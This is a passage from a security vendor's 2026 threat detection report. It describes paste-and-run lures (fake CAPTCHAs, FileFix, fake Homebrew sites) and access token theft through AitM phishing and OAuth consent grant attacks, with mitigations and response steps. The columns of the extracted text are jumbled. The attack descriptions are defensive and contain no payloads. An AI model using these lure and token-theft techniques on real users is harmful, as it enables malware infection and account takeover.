• The user has to “fix” their access to a
document, website, or software installation/ • Scarlet Goldfinch
update by following the instructions in the • Information stealers
paste-and-run lure. like Atomic and Odyssey Stealer
• A CAPTCHA-style lure prompting the user to • RMM tools
follow given instructions to prove they are a • Mocha Manakin
human in order to gain access to a document, • NetSupport Manager
website, or installation/update process. • LummaC2
• Vidar
In most scenarios, once users interact with the Fix • XMRig
or Verify button in the lure, the button will covertly • HijackLoader
copy an obfuscated PowerShell command to the • Arechclient2
clipboard and present the user with “verification • KongTuke
steps.” These typically consist of running a • Legion Loader
shortcut to open the Windows run dialog, pasting
the unknowingly-copied PowerShell command, Given how successful they’ve been, it
and pushing enter. By following the “verification shouldn’t be a surprise that paste-and-run
steps,” the user inadvertently runs the command lures have reportedly taken other forms as well,
and additional commands will reach out and including fake error messages from malicious
download malware or tools. phishing attachments as well as through fake
Windows Update screens.

2026 THREAT DETECTION REPORT 66
Variations
A popular paste-and-run variant seen in Some adversaries have used lures designed
2025 called “FileFix” relies on leveraging the specifically for macOS users that encourage
Windows File Explorer address bar to execute the user to open Spotlight, then macOS Terminal
commands. KongTuke, a traffic distribution to execute malicious commands.
system (TDS) that leverages compromised
WordPress sites and the seventh most prevalent For instance, in 2025, adversaries created
threat we observed last year, used both the fake websites that mimic trusted macOS dev
fakeCAPTCHA and the FileFix version of paste tools like Homebrew to spread Odyssey and
and run in 2025. Atomic Stealer. These sites then prompt users
to copy and paste seemingly benign installation
While paste-and-run campaigns have largely commands into Terminal, which secretly
affected Windows machines, they can also downloads and executes the stealer.
pose a risk to other operating systems.
Take action
Visit the Malicious Copy and Paste technique
page to explore:
Users should know that no
• relevant MITRE ATT&CK data sources
legitimate process will prompt
• log sources to expand your collection
them to use shortcuts that
• detection opportunities you can tune
include the Windows button and
to your environment
• atomic tests to validate your coverage or and by pasting ( )
R X Ctrl + V
unknown scripts or commands.
One mitigation strategy is to ensure users
are educated about how adversaries take
advantage of their digital conditioning.
Specifically, organizations should familiarize
users with the forms that paste-and-run dialog as well as Windows hotkeys, preventing
lures can take, including being presented with paste and run’s use of or ,
Windows+R Windows+X
unexpected prompts to verify their humanity, as well as paste ( ).
Ctrl + V
update software, or fix an error by opening the
terminal, PowerShell, or a run dialog box. While it could be difficult to implement in scale,
organizations could also disable and
cmd.exe
Users should know that no legitimate process execution for standard users,
powershell.exe
will prompt them to use shortcuts that include though due to the popularity and utility of these
the Windows button and or and by pasting features, it does not seem this strategy has been
R X
( ) unknown scripts or commands. widely adopted by enterprises. It’s worth noting
Ctrl + V
that disabling and
cmd.exe powershell.exe
Another mitigation strategy for the Windows could also affect system functionality, as many
version of paste and run is to implement a Group legitimate Windows processes and third-party
Policy Object (GPO) disabling access to the Run applications use them.

22002266 TTHHRREEAATT DDEETTEECCTTIIOONN RREEPPOORRTT 6677
Steal Application Access Token
Adversaries abuse application access tokens to gain unauthorized access to cloud,
container-based, or SaaS resources, as seen in OAuth consent grant attacks.
Analysis How do adversaries steal application
access tokens?
Why do adversaries steal application In general, adversaries conduct adversary-
access tokens? in-the-middle (AitM) attacks where they steal
access tokens by tricking users into disclosing
Applications generate access tokens in order to their credentials by authenticating via a spoofed
give successfully authenticated (and authorized) login page. These pages work by intercepting
users and services to APIs that allow them to credentials as they are entered into the
perform actions within cloud resources, containers, phishing page—including additional factors of
SaaS applications, and other systems. Adversaries authentication—and forwarding them to the
attempt to intercept these tokens because they adversary in real time so that they can then
need access to APIs in order to accomplish their log into the legitimate domain. This allows the
objectives in the cloud. adversary to steal a token as it is issued to
the user.
OAuth application consent grant attacks are
a specific variety of token theft that adversaries Adversaries also leverage stealer malware to
leverage because it allows them persistent access steal both short and long-term passwords, keys,
to resources without relying on user credentials. or tokens. The most recent Shai-Hulud attack is
By tricking users into granting permissions to a one prominent example of this, where adversaries
malicious or compromised app, adversaries can leveraged compromised npm packages to deploy
act on the user’s behalf, bypassing traditional credential-stealing malware. The malware in turn
security controls and maintaining access even if used access keys stored on an infected endpoint
user credentials are changed or revoked. to further enumerate cloud environments to gain
access to more long-term access keys.
In the case of OAuth consent grant attacks,
adversaries typically send targeted phishing emails
or messages that appear to come from trusted
Red Canary
sources, often promoting a new productivity tool or
urgent business application. When users click the
SecOps Weekly
provided link, they are redirected to a legitimate
OAuth consent screen. The screen displays the
grants the malicious attacker’s app will utilize. If
the user approves, the attacker gains persistent
Save your spot access to the permissions they agreed to.

2026 THREAT DETECTION REPORT 68
OAUTH APPLICATION CONSENT GRANT ATTACK CHAIN
OAuth application consent grant attacks are primarily a threat in Entra ID and Google Workspace
environments because these platforms rely heavily on OAuth for third-party integrations and user
productivity tools. Both environments allow users to grant applications access to email, files, contacts,
and other sensitive data through OAuth consent.
Read our case studies on what
OAuth application consent grant
attacks could look like on two
different platforms:
Entra ID Google Workspace

2026 THREAT DETECTION REPORT 69
Take action
Visit the Steal Application Access token Response
technique page to explore:
Remediating these threats changes upon
• relevant MITRE ATT&CK data sources how access tokens were stolen. In the case
• log sources to expand your collection of an AitM attack or credential stealer
• detection opportunities you can tune malware, revoke active sessions and
to your environment change the user’s password.
• atomic tests to validate your coverage
In the case of an OAuth application consent
Preventing token theft largely relies on minimizing grant attack, then you need to identify and
social engineering risk, which in turn relies on user remove the malicious OAuth application, revoke
awareness programs designed to educate users active sessions, and change the password for
about the dangers of phishing, AitM tradecraft, all users the OAuth app was delegated to.
and more.
Tracking follow-on activity for stolen access
Other technical controls to consider: tokens is highly dependent on the platform
of origin.
• Audit all cloud, container, and OAuth accounts
for necessity and appropriate permissions. SaaS apps
Adhere to the principle of least privilege.
• Block end-user consent to OAuth apps; For SaaS application suites such as Office 365
require admin approval for all OAuth requests. and Google Workspace, it is important to look
• Prevent users from registering new for signs of business email compromise.
applications; use a cloud access security These signs will surface as things such as
broker (CASB) to ban risky apps. malicious inbox rules, internal phishing
• In Azure, set “Users can register applications” campaigns, and persistence through the
and “Users can consent to apps” to “no” enrollment of MFA devices.
in portal settings. Reduce the allowed
permissions a user can grant a given Cloud platforms
OAuth app.
• In the Google Workspace Admin Console, For cloud platforms, it is important to quickly
navigate to the “Unconfigured third-party identify what the adversary was able to access
apps” settings. Select the option “Don’t with the access token, as the adversary may use
allow users to access any third-party apps.” it to achieve long-term persistence, elevate their
This action mandates that users submit privileges, or exfiltrate data.
access requests to administrators for any
unconfigured third-party apps, allowing for Adversaries may also leverage stolen tokens to
proper review and approval or dismissal. create new accounts, modify existing permissions,
Reduce the allowed permissions a user can or deploy additional malicious applications to
grant a given OAuth app. further entrench themselves. In some cases,
• Enforce role-based access control (RBAC) and adversaries use these tokens to bypass security
least privilege for all accounts. controls, disable logging, or to tamper with audit
• Use a CASB to manage cloud app permissions trails to evade detection. Monitoring for unusual
and restrict access to application tokens. administrative actions, privilege escalations, and
• In Kubernetes, set unexpected changes to security configurations is
critical for early detection and response.
automountServiceAccountToken: false
for pods not needing service account tokens.

22002266  TTHHRREEAATT  DDEETTEECCTTIIOONN  RREEPPOORRTT   7700
Acknowledgements
The following Canaries contributed to this year’s Threat Detection Report:
Brian  Katie
Donohue Nickels
| Alex      | Christina  | Chris  |
| --------- | ---------- | ------ |
| Berninger | Johns      | Velez  |
Jeff  Mitch
Felling Parish
| Chris | Jason  | Alex    |
| ----- | ------ | ------- |
| Brook | Killam | Walston |
Matt  Kyle
Graeber  Rainey
| Mike   | Milan     | Tre     |
| ------ | --------- | ------- |
| Devens | Klusacek  | Wilkins |
Jesse  Stef
Griggs  Rand
Tony
Lambert
Dominic  Dalton
Heidt Vanhooser
Susannah
Clark Matt